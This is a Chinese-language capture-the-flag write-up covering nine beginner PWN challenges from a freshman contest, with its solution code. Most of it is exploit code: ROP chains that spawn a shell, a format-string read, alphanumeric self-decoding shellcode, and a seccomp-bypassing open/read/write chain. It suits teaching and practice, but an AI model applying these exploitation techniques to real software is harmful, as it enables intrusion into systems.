---
title: 从某新生赛入门PWN
contest: 某新生赛 PWN 入门
year: 2022
difficulty: medium
vuln_type: pwn_unknown
tags: [encrypto还原, ezr0p, ezrop64, 格式化字符串, shellcoder字符限制, mprotect, 整数溢出, seccomp+orw, intorw]
attack_chain:
  - 题 1 ezcmp: 自实现 enccrypt (rand+buff+bua+buffff XOR), srand(v0=1) 固定种子, GDB 0x4014b4 断点读 buff
  - 题 2 ezr0p: 32 位栈溢出 0x20+call_system(0x08048562)+0x0804A080 bss 写 /bin/sh
  - 题 3 ezrop64: pop_rdi+binsh+ret+system
  - 题 4 ezfmt: 6 个 %p 找到 name 偏移, %7$s....+p64(0x4040a0) 读 name
  - 题 5 shellcoder: 字符限制 '0'~'z' 内构造 xor 自解码 syscall read
  - xor dword ptr[rsi+0x33],ecx 改写 rip + asm(shellcraft.sh()) 拼接
  - 题 6 shellcode: mprotect RWX + 0x108 溢出 + ret=0x4040a0
  - 题 7 int 溢出: gets 覆盖 number!=0 触发 cat flag
  - 题 8 arrayRE: 24 数字 0-9 爆破 decode(a1,a2)=(35*(a1-48)+18*(a2-48)+2)%10
  - 题 9 intorw: seccomp 限制 open/read/write, vuln int 整数溢出
  - puts_got 泄 libc + 二次溢出 orw(open 'flag', 3, bss, 0x100, read+puts)
  - pop_rsi=libc+0x2be51, pop_rdx_r12=libc+0x11f497
key_payload: '9 题 PWN: encrypto+rop32+rop64+fmtstr+字符shellcode+orw+seccomp'
one_liner: bad_c0de 某新生赛 9 题 PWN：encrypto 还原 + 32/64 位 ROP + fmtstr + 字符 shellcode + seccomp+orw。
lesson: encrypto 自实现加密直接 GDB 断点读密文 (srand(1) 固定种子)；字符限制 shellcode 用 xor [rsi+0x33], ecx 自解码 syscall；intorw seccomp 用 libc pop_rsi/pop_rdx_r12 gadget。
quality: high
---

# 从某新生赛入门PWN

## 概览
- **来源**: 看雪论坛 bad_c0de
- **类型**: 某新生赛 PWN 入门 9 题
- **难度**: ⭐⭐⭐

## 9 题清单

### 1. ezcmp (encrypto 还原)
```c
char* enccrypt(char *buf) {
    int a;
    for (int i = 0; i < 29; i++) {
        a = rand();
        buf[i] ^= buffff[i];
        buff[i] ^= bua[i];
        for (int j = 29; j >= 0; j--) {
            buf[j] = buff[i];
            buf[i] += '2';
        }
        buf[i] -= ((bua[i]^0x30) * (buffff[i]>>2) & 1) & 0xff;
        buf[i] += (a % buff[i]) & 0xff;
    }
}
int main() {
    srand(1);  // 固定种子
    enccrypt(buff);
    read(0, test, 30);
    if (!strncmp(buff, test, 30)) system("/bin/sh");
}
```
- GDB 0x4014b4 断点读 buff
- payload: `\x72\x40\x0e\xdc\xaa\x78\x46\x14\xe2\xb0\x7e\x4c\x1a\xe8\xb6\x84\x52\x20\xee\xbc\x8a\x58\x26\xf4\xc2\x90\x5e\x2c\xcb\xc8`

### 2. ezr0p (32 位 ROP)
```python
sl(b'/bin/sh')  # read 到 bss 0x0804A080
payload = b'a'*0x20 + p32(0x08048562) + p32(0x0804A080)  # call system + 参数
```

### 3. ezrop64
```python
payload = b'a'*0x108 + p64(0x4012a3) + p64(binsh) + p64(0x40101a) + p64(system)
```

### 4. ezfmt
```python
payload = b'%7$s....' + p64(0x4040a0)
```

### 5. shellcoder (字符限制 '0'~'z')
```python
shellcode = '''
push rax; pop rsi
push 0x40404040; pop rax; xor rax, 0x40404040  # rax=0
push rax; pop rdi
push 0x40404040; pop rax; xor rax, 0x40404141  # rax=0x101
push rax; pop rdx
push 0x40404040; pop rax; xor rax, 0x40404040  # rax=0
push 0x60604040; pop rcx
xor dword ptr [rsi+0x33], ecx  # 自解码 syscall
'''
payload = b'a'*0x35 + asm(shellcraft.sh())  # 拼接到 rip
```

### 6. shellcode (mprotect RWX)
```python
payload = asm(shellcraft.sh())
sl(payload.ljust(0x108, b'\x00') + p64(0x4040a0))  # ret 到 buff
```

### 7. int 溢出
```c
int number = 0;
gets(name);
if (number != 0) system("cat flag");
```
- 直接发一长串覆盖 number

### 8. arrayRE (24 数字爆破)
```python
def decode(a1, a2):
    return (35*(a1-48) + 18*(a2-48) + 2) % 10
# 24 位数字满足 decode(a[i], i+ord(a[i]))+j+3)%10 == a[i+1]
```

### 9. intorw (seccomp + orw)
```python
# 1. 泄 libc_base
payload = b'a'*0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
# 2. 二次溢出 orw
sl('-100')  # 整数溢出
payload = b'a'*0x28 + p64(pop_rdi) + p64(0x601046) + p64(pop_rsi) + p64(0) + p64(open) \
    + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x601000) + p64(pop_rdx_r12) + p64(0x100) + p64(0) \
    + p64(read_plt) + p64(pop_rdi) + p64(0x601000) + p64(puts_plt)
# pop_rsi = libc + 0x2be51, pop_rdx_r12 = libc + 0x11f497
```
